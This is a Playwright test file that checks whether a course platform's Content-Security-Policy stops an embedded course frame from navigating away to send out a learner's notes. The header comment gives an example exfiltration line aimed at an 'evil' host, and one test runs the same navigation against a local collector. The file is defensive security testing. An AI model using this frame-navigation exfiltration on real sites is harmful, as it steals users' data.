import { test, expect, type Page } from "@playwright/test";
import { createServer, type Server } from "node:http";
import { LEARNER, openSession, signIn, skipWithoutApi } from "./support/api";

/**
 * The shell's Content-Security-Policy, and the one thing it is really for.
 *
 * A course runs in a sandboxed frame on another origin and can navigate *itself*.
 * `location.href = 'https://evil/?d=' + theLearnersNotes` is a network request
 * carrying their work out, and nothing the courses origin sends can stop it:
 * connect-src governs fetch, form-action governs form submission, and there is no
 * directive for where a document may navigate itself. Only the embedding document's
 * frame-src applies — so it has to be the shell that says no.
 *
 * Detection here is server-side. A collector records the requests it actually
 * receives, so a passing test means the request was never made rather than that the
 * page failed to report it.
 */

const SLUG = "docker-fundamentals";
const COLLECTOR_PORT = 4931;
const COLLECTOR = `http://127.0.0.1:${COLLECTOR_PORT}`;

let collector: Server;
let hits: string[] = [];

test.beforeAll(async () => {
  await new Promise<void>((resolve) => {
    collector = createServer((req, res) => {
      hits.push(req.url ?? "");
      res.writeHead(200, { "content-type": "text/html" }).end("<p>collected</p>");
    });
    collector.listen(COLLECTOR_PORT, "127.0.0.1", resolve);
  });
});

test.afterAll(() => {
  collector?.close();
});

test.beforeEach(async ({ page }) => {
  await skipWithoutApi(page);
  await page.route(/fonts\.(googleapis|gstatic)\.com/, (route) => route.abort());
  hits = [];
  await signIn(page, LEARNER);
  await page.goto(`/courses/${SLUG}`);
  const start = page.getByRole("button", { name: "Start this course" });
  if (await start.isVisible().catch(() => false)) await start.click();
});

// Control: the course must be loaded and interactive, or these prove nothing.
const openPlayer = (page: Page) => openSession(page, SLUG, "s1");

test("the shell sends a CSP naming the courses origin", async ({ page }) => {
  const response = await page.goto("/login");
  const csp = response?.headers()["content-security-policy"] ?? "";

  expect(csp).toContain("frame-src");
  expect(csp).toContain(process.env.NEXT_PUBLIC_COURSES_ORIGIN ?? "127.0.0.1:3101");
  // Bud is not embeddable by anyone.
  expect(csp).toContain("frame-ancestors 'none'");
});

test("a course cannot navigate its own frame off the courses origin", async ({ page }) => {
  await openPlayer(page);

  const frame = page.frames().find((f) => f.url().includes("3101"));
  expect(frame, "the course frame should be mounted").toBeTruthy();

  // Exactly what a hostile course would do: no popup, no fetch, just leave.
  await frame!
    .evaluate((url) => {
      // This runs inside the course's frame, not the Next app, and navigating away
      // is the attack being tested rather than a routing mistake.
      // eslint-disable-next-line @next/next/no-location-assign-relative-destination
      location.href = `${url}/?stolen=THE_LEARNERS_NOTES`;
    }, COLLECTOR)
    .catch(() => {
      /* the navigation may be torn down; the collector is the real check */
    });

  await page.waitForTimeout(1500);

  expect(hits, "the frame reached an origin frame-src does not allow").toEqual([]);

  /**
   * And it never got there. A blocked navigation leaves the frame blank rather than
   * parked where it started, which is fine — a course that tries this has broken
   * itself, and only itself. That the policy does not break *legitimate* loading is
   * the next test's job, not this one's.
   */
  const reached = page.frames().some((f) => f.url().includes(String(COLLECTOR_PORT)));
  expect(reached, "the frame should never have reached the collector").toBe(false);
});

test("the course still loads and saves with the policy in place", async ({ page }) => {
  await openPlayer(page);

  const tick = page.frameLocator('iframe[title*="Docker"]').locator("#t1");
  await tick.uncheck({ force: true });
  await tick.check({ force: true });

  // frame-src must not have cost the bridge anything.
  await expect(page.getByRole("status").filter({ hasText: "Saved" })).toBeVisible();
  expect(hits).toEqual([]);
});
